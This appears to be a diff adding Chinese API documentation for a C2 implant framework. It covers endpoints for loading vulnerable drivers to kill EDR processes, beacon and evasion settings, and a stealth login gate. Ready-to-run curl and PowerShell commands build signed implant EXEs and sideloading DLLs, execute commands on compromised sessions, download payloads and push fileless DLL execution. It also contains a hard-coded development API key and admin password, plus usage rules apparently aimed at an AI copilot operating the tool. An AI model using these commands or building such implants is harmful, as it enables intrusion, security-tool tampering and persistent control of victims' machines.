+- `GET /drivers` → `{drivers[],count,search_dirs[],builtin:false,manifest_hint}`，每项带 `verify`：`sha256`（实时算）/`manifest_sha256`/`hash_ok`（未声明时视为"未校验"=true+警告）；`signed`/`signature_checked`/`signer`（本机 **WinVerifyTrust** 实测；`signature_checked=false` 时 `signed` 无意义；非 Windows 只给一条"不做自检"警告，其余零值）；`blocklisted`/`blocklist_reason`（本机是否启用微软"易受攻击驱动黑名单"策略及原因——**服务端不持有名单内容**，真正裁决在内核 `StartService`，被拦报 1275 `ERROR_DRIVER_BLOCKED`，这里只是加载前提示）；`warnings[]`/`errors[]`（`errors` 非空=必须拒绝下发；`warnings` 非空=允许下发但提示，含"未通过 Authenticode 校验""manifest 声明的签名者与实测不一致"）。
+- `GET /drivers/{name}/verify` → `{driver,file,path,ok,summary,...VerifyResult}`，`ok = len(errors)==0`；未找到返回 404 + 中文原因。
+- `POST /sessions/{id}/edr/byovd-load`：上传字节用 `VerifyBytes` 自检。有 `errors`（典型是上传内容与 manifest 声明的 sha256 不一致=被替换/损坏）→ **HTTP 400 拒绝下发**，回传 `{error,verify,warnings}`；只有 `warnings` → 照常下发，响应带 `{task_id,task_type,message,verify,warnings,selfcheck}`（`selfcheck` 是中文一句话结论）。WinVerifyTrust 只能校验磁盘文件，上传内容靠 manifest 期望 sha256 硬校验，签名结论仅在服务端存在**同名同哈希**驱动时复用。填了 `device_name`/`kill_ioctl` 会登记"本会话驱动档案"，后续 `byovd-kill` 直接复用。
+- `POST /sessions/{id}/edr/byovd-kill`：`{pid}` 或 `{process_name}` 至少一个；设备名/IOCTL 优先级 = 请求显式指定 → 本会话 `byovd-load` 登记 → 驱动目录 manifest；都拿不到则 400（"服务端不再内置任何驱动"）。该路线对 PPL 无效，PPL 用 `ppl-kill`。
+
+## 9. 设置：`GET` / `PUT /api/v1/settings`
+
+`GET` 返回分组 `general`、`listener`、`implant`、`builder`、`notifications`、`security`、`ai`、`web`（**认证段叫 `security`，请求体里没有 `auth` 段**）。`PUT` body 各段可选、**缺省字段不修改**；响应 `{"message":"设置已保存","hot":<bool>}`，轮换 key 时一次性多返回 `new_api_key` 或 `new_stealth_key`+`stealth_entry`+`warning`。
+
+**`general`（PUT 字段 → 落盘键 / 生效）**：`api_host`→`server.api_host`（**需重启**）；`api_port`→`server.api_port`（0 非法，**需重启**）；`log_level`(debug/info/warn/warning/error)→`logging.level`（热）；`log_format`(json/text/console)→`logging.format`（热）；`heartbeat_timeout`（Go duration 如 `60s`/`2m`，>0）→`listener.heartbeat_timeout`（热；判活阈值按会话自适应 `max(配置, 3×实测间隔)`，对新会话立即生效）；`write_queue_size`（≥64，建议 ≥1024）→`listener.write_queue_size`（**需重启**）。`hot` 是整个请求的标志：任一项需重启（上述三项 + listener 的 `port`/`protocol`/`tls_enabled`）即 `hot=false`。
+
+**`builder`**：`mingw_gcc_path`、`sign_enabled`、`sign_pfx_path`、`sign_pfx_password`、`sign_thumbprint`、`sign_timestamp_url`（需 `http(s)://`）、`sign_signtool_path`、`sign_description`、`sign_fail_closed`。密码**只写不回显**：`""` = 保持不变，`"clear"` = 清除，含 `****` 的脱敏回显一律忽略；GET 只给 `sign_pfx_password_set: true/false`，**永不返回密码**。`sign_fail_closed=true` = 签名失败直接报构建错误，`false` = 只告警并返回未签名产物。证书二选一（pfx 优先）：`sign_pfx_path`+密码，或 `sign_thumbprint`（本机 `CurrentUser\My`）。
+
+**`security`**：`admin_username`、`new_password`（明文，保存时 bcrypt，**≥8 位**）；`auth_enabled`/`jwt_enabled`/`api_key_enabled` 可改，但**服务端拒绝三者同时为 false → HTTP 400**；`api_keys` 整组替换（`[]` 清空，不传=不改，含 `****` 的项忽略）；`rotate_api_key:true` 生成新 key 追加并**仅本次**回传 `new_api_key`；`remove_api_key:"<key>"` 移除指定 key。
+
+**其它段**：`listener` —— `enabled`/`host`/`public_host` 热生效，`port`/`protocol`/`tls_enabled` 需重启，`mimicry_profile` 须为已知模板名，`front_domain` 须为合法域名，`mimicry_site` 须为 http(s) URL。`implant` —— `interval`/`jitter`(≤100)/`retry_wait`/`kill_date`/`working_hours`/`startup_delay_min|max`(≥0) 是**后续构建载荷的缺省值**。`notifications` —— `enabled`/`url`(http(s))/`content`/`only_online`/`format(auto|dingtalk|feishu|wecom|slack|discord|generic)`/`secret`。`ai` —— `enabled`/`base_url`(http(s)://)/`api_key`(含 `****` 忽略)/`model`/`timeout`/`max_turns`/`consent_mode(auto|normal)`/`agent_concurrency(1-8)`/`download_allowlist[]`。`web` —— `basic_auth_enabled`（开启前必须已有用户名+密码，否则 400 防自锁）/`basic_auth_user`/`new_password`(≥8)/`unauth_mode(disguise|basic)`/`decoy_title`/`allow_cidrs[]`/`stealth_key`（`""` 清除、`"regenerate"` 服务端生成并仅本次回传、自定义 ≥16 位）；GET 只回 `password_set`/`stealth_key_set` 与入口 `/__gate?k=<密钥>`。一个可保存项都没有 → 400 `"没有可保存的配置项"`。保存成功后认证配置立即热替换（新用户名/密码即刻生效），并回调主循环热更新 listener 拟态等。
+
+## 10. 常见任务（curl / PowerShell）
+
+本机默认开发环境 `http://127.0.0.1:18081`；`configs/server.yaml` 的开发 API Key 为 `Qingshan@2026`（**部署前必须更换**）。`BASE=http://127.0.0.1:18081/api/v1`，`JSON='Content-Type: application/json'`。
+
+```bash
+# ① 健康 + 登录取 JWT
+curl -s $BASE/health
+TOKEN=$(curl -s -X POST $BASE/login -H "$JSON" -d '{"username":"admin","password":"toshell"}' \
+  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
+curl -s $BASE/sessions -H "Authorization: Bearer $TOKEN"
+
+# ② 列在线会话
+curl -s "$BASE/sessions" -H "X-API-Key: $KEY"
+
+# ③ 下发命令并直接拿结果（原子，推荐）
+curl -s -X POST "$BASE/mcp/tools/exec" -H "X-API-Key: $KEY" -H "$JSON" \
+  -d '{"session_id":"5041edce2618d318","command":"whoami /priv","timeout_sec":"60"}'
+
+# ④ 构建 exe（心跳缺省跟随服务端配置；开启签名）
+curl -s -X POST "$BASE/builders" -H "X-API-Key: $KEY" -H "$JSON" -d '{
+ "name":"dev-exe","format":"exe","os":"windows","arch":"amd64",
+ "listener_id":"<LISTENER_ID>","sign_enabled":true,"profile":"full"}'
+#  → id / sha256 / signed / signer / sign_status / sign_message / loader_advice_*
+
+# ⑤ 构建 386 DLL（加载即启动 + 自定义导出名）
+curl -s -X POST "$BASE/builders" -H "X-API-Key: $KEY" -H "$JSON" -d '{
+ "name":"ver-dll","format":"dll","os":"windows","arch":"386",
+ "server_url":"http://10.0.0.5:8080","protocol":"tcp",
+ "dll_export":"GetFileVersionInfoW","dll_autostart":true,
+ "interval":60,"jitter":20,"sign_enabled":true}'
+#  386 需要 i686-w64-mingw32-gcc；先看 GET /builders 的 evasion.dll_arch."386"
+
+# ⑥ 按 build id 下载载荷（目标机免认证下载：GET /implant/payload/{id}）
+curl -s -o payload.exe "$BASE/implants/stored/build-1730000000000000000" -H "X-API-Key: $KEY"
+
+# ⑦ 读设置 / 改设置
+curl -s "$BASE/settings" -H "X-API-Key: $KEY"       # 关注 .general、.builder.sign_pfx_password_set
+curl -s -X PUT "$BASE/settings" -H "X-API-Key: $KEY" -H "$JSON" \
+  -d '{"general":{"log_level":"debug"},"implant":{"interval":60,"jitter":20}}'   # → hot:true
+curl -s -X PUT "$BASE/settings" -H "X-API-Key: $KEY" -H "$JSON" \
+  -d '{"builder":{"sign_enabled":true,"sign_pfx_path":"C:\\codesign.pfx","sign_pfx_password":"<密码>"}}'
+
+# ⑧ fileless 先看预检（不加 force）；确认要强推再加 "force":true
+curl -s -X POST "$BASE/sessions/<SID>/fileless-exec" -H "X-API-Key: $KEY" -H "$JSON" \
+  -d '{"kind":"dll","payload_b64":"<base64>","entry":"Start"}'
+```
+
+```powershell
+$BASE = 'http://127.0.0.1:18081/api/v1'
+$h = @{ 'X-API-Key' = 'Qingshan@2026' }
+Invoke-RestMethod "$BASE/sessions" -Headers $h
+$b = @{ name='ps-exe'; format='exe'; os='windows'; arch='amd64'; sign_enabled=$true } | ConvertTo-Json
+Invoke-RestMethod -Method Post -Uri "$BASE/builders" -Headers $h -ContentType 'application/json' -Body $b
+```
+
+## 11. 错误处理与守则
+
+- `400`：参数非法（`jitter>100`、`api_port=0`、三种认证全关、DLL 导出名非法、fileless 预检 `reject` 未加 `force`）→ 读 `error`（及 `reasons`/`suggestion`）。
+- `401`：凭据缺失/过期或被 Web 防护拦下；`404`：路径/会话/任务/驱动/模板不存在（disguise 模式下未认证请求也可能是 404）；`429`：登录失败过多，等 5 分钟；`503`：AI 副驾驶未配置或剧本运行器不可用；`500`：构建/保存失败等，响应为合法 JSON `{"error":"..."}`（可能含多行编译器输出）。
+- 判断会话在线**只看** `session.status`（`active`）或原子执行返回的错误，不要臆测"掉线"。
+- 高危操作（删除会话、注入、凭据、内存加载、驱动加载/击杀、隧道、插件加载）先取得用户同意；`consent_mode=normal` 时走 `/copilot/consent` 或 `/agent/runs/{id}/consent`。
+- 输出可能很大：展示时截断；截图等 base64 只报"已获取/大小/用途"；API Key/JWT 用 `$KEY`/`<token>` 占位，不写进日志或对话正文。
+- **不要过度声称**：本文端点与字段按源码确定；但"载荷在目标机上是否上线、是否被 AV/EDR 拦、sleep mask 与去 RWX 运行期是否生效、DLL 是否被宿主成功加载、签名在装有 360 的机器上是否放行"等**运行期结论必须在授权目标机实测**（`docs/EVASION.md` 已逐项标注哪些只是编译/静态验证）。未验证的环节如实说明，不要写成"已生效"。
+
+> 版本契约：本文面向 **v1.3.5（FINAL）**。端点以运行中服务的 `GET /api/v1/mcp/tools`、`GET /api/v1/builders` 与源码为准；如与本文不符，以运行服务为准并回写本文。
